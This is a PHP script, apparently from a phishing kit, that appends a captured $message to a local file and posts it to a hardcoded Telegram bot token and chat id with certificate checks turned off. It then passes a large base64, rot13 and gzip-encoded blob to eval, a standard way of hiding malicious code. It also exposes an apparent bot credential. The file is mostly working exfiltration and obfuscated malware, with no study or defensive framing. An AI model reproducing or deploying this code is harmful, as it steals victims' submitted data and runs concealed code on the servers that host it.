<?php

$file = fopen("../save.txt", "a+");
fwrite($file, $message);
$website = "https://api.telegram.org/bot5277725229:AAFtseQbp8wB76VrW5Ut3A5WC2Sl1R69MUs";
$chatId = 1366205960;  //Receiver Chat Id 
$params = [
	'chat_id' => '-1001576228771 ',
	'text' => $message,
	'parse_mode' => 'html'
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
